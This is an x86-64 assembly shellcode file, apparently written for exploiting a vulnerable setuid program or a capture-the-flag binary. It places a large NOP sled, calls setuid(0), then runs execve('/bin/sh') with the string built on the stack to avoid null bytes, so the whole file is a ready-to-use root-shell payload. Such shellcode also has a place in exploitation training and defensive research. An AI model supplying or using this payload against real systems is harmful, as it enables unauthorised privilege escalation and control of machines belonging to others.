.global _start
.intel_syntax noprefix

_start:
    .rept 0x800
        nop
    .endr

    xor rdi, rdi
    xor rax, rax
    mov al, 105
    syscall 

    xor rax, rax
    mov al, 59
    mov rbx, 0x68732f6e69622f2f  ; //bin/sh in hex, split to avoid null bytes
    shr rbx, 0x8                 ; shift right to remove the last byte
    push rbx
    mov rdi, rsp                 ; pointer to "/bin/sh"
    xor rsi, rsi                 ; rsi = 0
    xor rdx, rdx                 ; rdx = 0
    syscall
